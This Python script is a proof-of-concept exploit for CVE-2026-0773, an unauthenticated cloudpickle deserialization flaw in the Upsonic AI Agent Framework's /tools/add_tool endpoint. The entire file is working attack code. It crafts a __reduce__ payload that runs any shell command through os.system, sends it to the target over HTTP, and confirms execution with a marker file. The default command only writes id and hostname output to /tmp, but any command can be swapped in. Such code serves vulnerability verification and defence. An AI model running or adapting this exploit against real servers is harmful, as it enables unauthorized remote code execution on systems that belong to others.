#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Upsonic Cloudpickle Deserialization RCE (add_tool)
# CVE            : CVE-2026-0773
# Vendor         : Upsonic
# Product        : Upsonic AI Agent Framework
# Affected       : v0.36.0 through v0.55.6
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-0773 — Vector 1: POST /tools/add_tool (proxied to tools_server)

Demonstrates CWE-502 in Upsonic v0.36.0 through v0.55.6. The /tools/add_tool
endpoint accepts base64-encoded cloudpickle data and deserializes it without
validation, enabling unauthenticated RCE.

ATTACK CHAIN:
  1. Craft malicious cloudpickle payload with __reduce__ gadget
  2. Base64-encode and send via POST /tools/add_tool
  3. Payload is proxied to internal tools_server
  4. cloudpickle.loads() triggers arbitrary code execution

PREREQUISITES:
  - Network access to Upsonic main server (default port 7541)
  - No authentication required
  - cloudpickle Python package (attacker side)

REFERENCES:
  - CVE-2026-0773
  - https://www.zerodayinitiative.com/advisories/ZDI-26-042/
"""

import sys
import json
import base64
import urllib.request
import urllib.error
import subprocess
import time

# Default target configuration (matches lab setup)
DEFAULT_PORT = 7541
MARKER_FILE = "/tmp/cve-2026-0773-pwned"
RCE_COMMAND = f"id > {MARKER_FILE} && echo EXPLOITED >> {MARKER_FILE} && cat /etc/hostname >> {MARKER_FILE}"


def generate_payload(command: str) -> str:
    """
    Generate a malicious cloudpickle payload that executes an arbitrary
    OS command during deserialization.

    The __reduce__ method is called by pickle/cloudpickle during loads().
    It returns a tuple of (callable, args) which the deserializer invokes.
    Here we use os.system to execute a shell command.
    """
    import cloudpickle
    import os

    class RCEPayload:
        """Malicious class that executes a command when deserialized."""
        def __reduce__(self):
            # os.system() is invoked during cloudpickle.loads()
            return (os.system, (command,))

    # Serialize the malicious object and base64-encode it
    serialized = cloudpickle.dumps(RCEPayload())
    encoded = base64.b64encode(serialized).decode('utf-8')
    return encoded


def send_exploit(target_host: str, target_port: int, payload: str) -> dict:
    """
    Send the exploit payload to the /tools/add_tool endpoint.

    POST /tools/add_tool
    Content-Type: application/json
    Body: {"function": "<base64-encoded cloudpickle payload>"}

    The main server on port 7541 proxies this to the tools_server on
    port 8086, which calls cloudpickle.loads() on the decoded data.
    """
    url = f"http://{target_host}:{target_port}/tools/add_tool"
    body = json.dumps({"function": payload}).encode('utf-8')

    req = urllib.request.Request(
        url,
        data=body,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "CVE-2026-0773-PoC/1.0",
        },
        method="POST",
    )

    print(f"[*] Target: {url}")
    print(f"[*] Payload size: {len(payload)} bytes (base64)")
    print(f"[*] Command: {RCE_COMMAND}")
    print(f"[*] Sending exploit payload...")

    try:
        with urllib.request.urlopen(req, timeout=30) as response:
            status = response.status
            resp_body = response.read().decode('utf-8')
            return {"status": status, "body": resp_body, "error": None}
    except urllib.error.HTTPError as e:
        # HTTP errors (4xx, 5xx) — the exploit may still have executed
        # because cloudpickle.loads() runs BEFORE the add_tool_ function
        resp_body = e.read().decode('utf-8') if e.fp else ""
        return {"status": e.code, "body": resp_body, "error": str(e)}
    except urllib.error.URLError as e:
        return {"status": None, "body": "", "error": f"Connection error: {e.reason}"}
    except Exception as e:
        return {"status": None, "body": "", "error": str(e)}


def check_server(target_host: str, target_port: int) -> bool:
    """Verify the target Upsonic server is running via /status endpoint."""
    url = f"http://{target_host}:{target_port}/status"
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read())
            if data.get("status") == "Server is running":
                print(f"[+] Target is running: {data}")
                return True
    except Exception as e:
        print(f"[-] Cannot reach target: {e}")
    return False


def verify_rce(container_name: str = "cve-2026-0773-vulnerable") -> bool:
    """
    Verify RCE by checking if the marker file was created inside the
    target container. Uses docker exec to inspect the container filesystem.
    """
    print(f"\n[*] Verifying RCE — checking {MARKER_FILE} in container...")
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", MARKER_FILE],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode == 0 and result.stdout.strip():
            print(f"[+] SUCCESS! Marker file contents:")
            print(f"    ---")
            for line in result.stdout.strip().split('\n'):
                print(f"    {line}")
            print(f"    ---")
            return True
        else:
            print(f"[-] Marker file not found or empty")
            if result.stderr:
                print(f"    stderr: {result.stderr.strip()}")
            return False
    except subprocess.TimeoutExpired:
        print(f"[-] docker exec timed out")
        return False
    except FileNotFoundError:
        print(f"[-] docker command not found — cannot verify via docker exec")
        print(f"[*] Try manually: docker exec {container_name} cat {MARKER_FILE}")
        return False


def cleanup(container_name: str = "cve-2026-0773-vulnerable"):
    """Remove the marker file from previous runs."""
    try:
        subprocess.run(
            ["docker", "exec", container_name, "rm", "-f", MARKER_FILE],
            capture_output=True,
            timeout=5,
        )
    except Exception:
        pass


def exploit(target_host: str, target_port: int):
    """
    Full exploit chain for CVE-2026-0773:
    1. Verify target is running
    2. Clean up any previous marker files
    3. Generate malicious cloudpickle payload
    4. Send payload to /tools/add_tool endpoint
    5. Verify RCE by checking marker file
    """
    print("=" * 65)
    print("  CVE-2026-0773 — Upsonic Cloudpickle Deserialization RCE")
    print("  Vector: POST /tools/add_tool (proxied to tools_server)")
    print("=" * 65)
    print()

    # Step 1: Verify target is running
    print("[*] Step 1: Checking target server...")
    if not check_server(target_host, target_port):
        print("[-] FAILED: Target server is not reachable")
        sys.exit(1)
    print()

    # Step 2: Clean up previous runs
    print("[*] Step 2: Cleaning up previous marker files...")
    cleanup()
    print("[+] Cleanup done")
    print()

    # Step 3: Generate malicious payload
    print("[*] Step 3: Generating cloudpickle RCE payload...")
    payload = generate_payload(RCE_COMMAND)
    print(f"[+] Payload generated ({len(payload)} bytes base64)")
    print(f"    Payload preview: {payload[:80]}...")
    print()

    # Step 4: Send exploit
    print("[*] Step 4: Sending exploit to target...")
    result = send_exploit(target_host, target_port, payload)
    print(f"[*] Response status: {result['status']}")
    if result['body']:
        print(f"[*] Response body: {result['body'][:200]}")
    if result['error']:
        print(f"[!] Error (may still be exploited): {result['error']}")
    print()

    # Brief pause for command execution
    time.sleep(1)

    # Step 5: Verify RCE
    print("[*] Step 5: Verifying Remote Code Execution...")
    if verify_rce():
        print()
        print("[+] " + "=" * 61)
        print("[+]  VULNERABILITY CONFIRMED: CVE-2026-0773")
        print("[+]  Remote Code Execution achieved via cloudpickle")
        print("[+]  deserialization on unauthenticated /tools/add_tool")
        print("[+] " + "=" * 61)
        return True
    else:
        print()
        print("[-] Could not verify RCE. The exploit may have failed or")
        print("    the verification method (docker exec) is not available.")
        return False


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    success = exploit(target, port)
    sys.exit(0 if success else 1)
